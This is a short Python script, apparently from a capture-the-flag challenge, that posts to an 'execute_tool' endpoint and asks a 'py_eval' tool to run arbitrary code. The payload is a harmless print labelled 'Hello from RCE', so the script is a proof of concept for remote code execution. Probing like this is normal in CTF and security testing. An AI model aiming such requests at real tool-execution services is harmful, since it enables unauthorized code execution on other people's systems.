import requests
import json

url = "http://cloud-big.hgame.vidar.club:32343/execute_tool"
headers = {
    "Content-Type": "application/json"
}
data = {
    "name": "py_eval",
    "arguments": {
        "code": "print('Hello from RCE')"
    }
}

try:
    response = requests.post(url, headers=headers, json=data)
    print(f"Status Code: {response.status_code}")
    print("Response Body:")
    print(response.text)
except Exception as e:
    print(f"Error: {e}")
